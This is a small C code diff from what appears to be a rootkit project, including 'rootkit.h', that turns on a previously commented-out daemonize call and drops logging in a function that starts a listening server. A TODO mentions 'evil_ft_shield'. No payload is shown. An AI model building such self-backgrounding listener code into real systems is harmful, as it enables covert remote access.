@@ -2,15 +2,14 @@
 #include "../includes/rootkit.h"
 
 t_daemon *create_daemon( void ) {
-	//logger.log_entry("Creating server", "INFO");
 	t_daemon *daemon;
-	//ft_daemonize();// TODO 	quitar esto
+	ft_daemonize();
 	daemon = malloc(sizeof(t_daemon));
 	if (init_server(daemon) == 0) {
         perror("Server not listening");
         exit(EXIT_FAILURE);
 	}
-	//logger.log_entry("Server created", "INFO");
+	
 	return daemon;
 }
 // TODO delete evil_ft_shield or make another logic
